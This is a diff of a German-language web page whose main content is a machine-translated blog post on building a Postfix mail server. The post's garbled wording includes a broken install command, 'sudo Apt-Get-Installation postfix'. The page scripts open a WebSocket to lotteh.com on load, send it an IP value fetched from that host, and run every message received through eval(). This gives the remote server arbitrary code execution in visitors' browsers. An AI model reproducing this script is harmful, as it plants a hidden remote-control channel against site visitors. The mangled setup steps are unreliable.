@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Wie erstelle ich einen Mailserver mit Postfix?BR> </p> <p> 1.Installieren Sie Postfix: Verwenden Sie Ihren Paket -Manager, um Postfix auf Ihrem Server zu installieren.Zum Beispiel können Sie auf Debian/Ubuntu `sudo apt-Get-Installation postfix`. </P> <p> <br> </p> <p> 2 ausführen.Konfigurieren Sie Postfix: Postfix -Konfigurationsdateien befinden sich in `/etc/postfix/`.Die Hauptkonfigurationsdatei lautet `main.cf`.Sie können diese Datei bearbeiten, um Ihren Mailserver gemäß Ihren Anforderungen einzurichten.Einige gängige Konfigurationen, die Sie möglicherweise festlegen müssen, enthalten den Domänennamen, die E -Mail -Relay -Einstellungen, virtuelle Domänen usw. </p> <p> <br> </p> <p> 3.Richten Sie DNS -Datensätze ein: Um die E -Mail -Lieferung sicherzustellen, müssen Sie die erforderlichen DNS -Datensätze (MX- und SPF -Datensätze) für Ihre Domain einrichten.Wenden Sie sich bei Bedarf an Ihren Domain -Registrar- oder DNS -Anbieter, um Hilfe zu erhalten. </P> <p> <br> </p> <p> 4.Konfigurieren Sie virtuelle Domänen und Benutzer: Wenn Sie mehrere Domänen auf Ihrem Mailserver hosten möchten, müssen Sie konfigurierenVirtuelle Domänen und Benutzer.Dies kann mit den Einstellungen von `virtual_alias_maps` und` virtual_mailbox_maps` in der Postfix -Konfigurationsdatei erfolgen. </P> <p> <br> </p> <p> 5.Sichern Sie Ihren Mailserver: Stellen Sie sicher, dass Ihr Mailserver sicher ist, indem Sie Firewall -Regeln einrichten, die TLS -Verschlüsselung für eingehende und ausgehende E -Mails verwenden und andere für Mail -Server empfohlene Sicherheitsmaßnahmen implementieren. </P> <p> <br> </p> <p> 6.Testen Sie Ihren Mailserver: Sobald alles eingerichtet ist, sollten Sie Ihren Mailserver durch Senden und Empfangen von Test -E -Mails testen.Verwenden Sie Tools wie Telnet oder Mailx, um E -Mails manuell zu senden, und prüfen Sie, ob sie erfolgreich empfangen werden.sicher.Es ist auch eine gute Idee, Mailserverprotokolle für Probleme oder verdächtige Überwachung zu überwachen</div>
+<div style="white-space: pre-wrap;"><p>Wie erstelle ich einen Mailserver mit Postfix?</p><p><br/></p><p>Um einen Mailserver mit Postfix zu erstellen, gehen Sie folgendermaßen vor:</p><p><br/></p><p>1. Installieren Sie Postfix: Verwenden Sie Ihren Paket -Manager, um Postfix auf Ihrem Server zu installieren. Zum Beispiel können Sie auf Debian/Ubuntu `sudo Apt-Get-Installation postfix` ausführen.</p><p><br/></p><p>2. Konfigurieren Sie Postfix: Postfix -Konfigurationsdateien befinden sich in `/etc/postfix/`. Die Hauptkonfigurationsdatei lautet `main.cf`. Sie können diese Datei bearbeiten, um Ihren Mailserver gemäß Ihren Anforderungen einzurichten. Einige gängige Konfigurationen, die Sie möglicherweise festlegen müssen, enthalten den Domänennamen, die E -Mail -Relay -Einstellungen, virtuelle Domänen usw.</p><p><br/></p><p>3. Einrichten von DNS -Datensätzen: Um die E -Mail -Lieferung sicherzustellen, müssen Sie die erforderlichen DNS -Datensätze (MX- und SPF -Datensätze) für Ihre Domain einrichten. Wenden Sie sich bei Bedarf an Ihren Domain -Registrar oder DNS -Anbieter, um Unterstützung zu erhalten.</p><p><br/></p><p>4. Konfigurieren Sie virtuelle Domänen und Benutzer: Wenn Sie mehrere Domänen auf Ihrem Mailserver hosten möchten, müssen Sie virtuelle Domänen und Benutzer konfigurieren. Dies kann mit den Einstellungen "virtual_alias_maps" und `virtual_mailbox_maps` in der Postfix -Konfigurationsdatei erfolgen.</p><p><br/></p><p>5. Ihren Mailserver sicherstellen: Stellen Sie sicher, dass Ihr Mailserver sicher ist, indem Sie Firewall -Regeln einrichten, die TLS -Verschlüsselung für eingehende und ausgehende E -Mails verwenden und andere Sicherheitsmaßnahmen implementieren, die für Mail -Server empfohlen werden.</p><p><br/></p><p>6. Testen Sie Ihren Mailserver: Sobald alles eingerichtet ist, sollten Sie Ihren Mailserver durch Senden und Empfangen von Test -E -Mails testen. Verwenden Sie Tools wie Telnet oder Mailx, um E -Mails manuell zu senden, und überprüfen Sie, ob sie erfolgreich empfangen werden.</p><p><br/></p><p>Denken Sie daran, Ihren Mailserver regelmäßig zu aktualisieren und zu verwalten, um sicherzustellen, dass er reibungslos und sicher ausgeführt wird. Es ist auch eine gute Idee, Mailserverprotokolle für Probleme oder verdächtige Aktivitäten zu überwachen.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
